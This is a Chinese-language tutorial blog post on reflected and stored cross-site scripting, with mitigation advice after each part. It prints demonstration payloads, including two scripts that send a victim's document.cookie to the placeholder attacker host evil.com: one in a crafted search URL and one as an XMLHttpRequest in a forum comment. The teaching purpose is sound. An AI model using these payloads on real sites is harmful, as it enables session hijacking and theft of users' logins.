---
title: XSS Attack
date: 2025-04-12 23:58:57
categories:
 - 计算机网络
tags:
 - 计算机网络
 - 网络安全
---

## 1. XSS 攻击

XSS（Cross-Site Scripting, 跨站脚本攻击）是一种常见的 Web 安全漏洞, 攻击者通过在网页中注入恶意脚本代码, 当其他用户浏览该页面时, 这些恶意脚本会在用户的浏览器中执行, 从而实现窃取用户信息、会话劫持等攻击目的, 

### 1.1. 反射型 XSS (Reflected XSS)

反射型 XSS 是一种非持久性跨站脚本攻击, 攻击者通过诱导用户点击包含恶意脚本的链接, 将恶意代码注入到目标网站的页面中, 恶意脚本通过用户的请求（通常是 URL 参数）被“反射”到服务器的响应中, 并在用户的浏览器中执行, 

- 攻击者构造一个包含恶意脚本的 URL（通常通过 GET 参数传递）
- 用户被诱导点击该 URL（例如通过钓鱼邮件或社交工程）
- 服务器接收到请求后，未经充分过滤或转义就将用户输入（包含恶意脚本）直接嵌入到响应页面中
- 浏览器收到响应后，执行页面中的恶意脚本，导致攻击生效

假设有一个简单的搜索网站 `example.com`, 用户可以在页面上输入搜索关键词, 服务器会将关键词显示在结果页面上, 例如, 用户输入 apple, URL 会变成 `http://example.com/search?q=apple`:

结果页面会显示:

```
您搜索了：apple
```

如果服务器没有对用户输入 q 参数进行过滤或转义, 攻击者可以构造一个恶意 URL:

```
http://example.com/search?q=<script>alert('Hacked!');</script>
```

当用户点击这个链接时，服务器会将 `<script>alert('Hacked!');</script>` 直接嵌入到响应页面中，生成如下 HTML:

```html
<div>
  您搜索了：<script>alert('Hacked!');</script>
</div>
```

用户的浏览器会解析并执行这个脚本，弹出一个提示框显示 Hacked!

攻击者可能不仅仅是弹窗, 而是窃取用户的 Cookie 或重定向到恶意网站, 例如, 构造如下 URL:

```
http://example.com/search?q=<script>document.location='http://evil.com/steal?cookie='+document.cookie;</script>
```

当用户点击后，浏览器会执行脚本，将用户的 Cookie 发送到攻击者的服务器 `evil.com`

**防御措施**

- 对用户输入进行严格的**输入验证**和**输出编码**（例如，将 `<` 编码为 `&lt;`）
- 使用安全的框架（如 React 或 Angular），它们通常会自动对输出进行转义
- 启用 Content Security Policy (CSP)，限制页面加载的脚本来源
- 对 URL 参数进行过滤，拒绝包含可疑字符的请求

### 1.2. 存储型 XSS (Stored XSS)

存储型 XSS 是一种持久性跨站脚本攻击, 攻击者将恶意脚本注入到目标网站的数据库或其他存储介质中, 当其他用户访问受感染的页面时, 服务器会从存储中取出恶意脚本并将其嵌入到页面, 脚本会在用户的浏览器中执行:

- 攻击者通过网站的输入点（如评论区、用户资料、帖子等）提交包含恶意脚本的内容

- 服务器未对输入进行充分过滤，将恶意脚本保存到数据库
- 当其他用户访问相关页面时，服务器从数据库中取出数据（包含恶意脚本），并将其嵌入到页面中
- 用户的浏览器加载页面时，执行恶意脚本

假设有一个论坛网站, 用户可以在帖子中发表评论, 如果服务器没有对评论内容进行过滤, 攻击者可以在评论中输入恶意脚本, 例如, 攻击者在评论框中输入:

```
<script>alert('You are hacked!');</script>
```

这条评论被保存到数据库中, 每当其他用户访问这个帖子时, 服务器会从数据库中取出评论内容并直接渲染到页面, 生成如下 HTML:

```html
<div class="comment">
  <script>alert('You are hacked!');</script>
</div>
```

所有访问该帖子的用户都会在浏览器中看到 You are hacked! 的弹窗, 攻击者可能利用存储型 XSS 进行更严重的攻击, 例如窃取用户会话或执行钓鱼攻击, 假设攻击者在评论中输入:

```js
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://evil.com/steal?cookie=' + document.cookie, true);
  xhr.send();
</script>
```

这条评论被存储后, 任何访问该页面的用户的 Cookie 都会被发送到攻击者的服务器 evil.com, 如果网站使用 Cookie 进行身份验证, 攻击者可能窃取用户的会话, 冒充用户进行操作, 

**防御措施**

- 使用 HTTPOnly 和 Secure Cookie 标志, 降低 Cookie 窃取的风险
- 启用 Content Security Policy (CSP), 限制脚本执行
- 对用户输入进行严格的**输入验证**, 只允许安全的字符和格式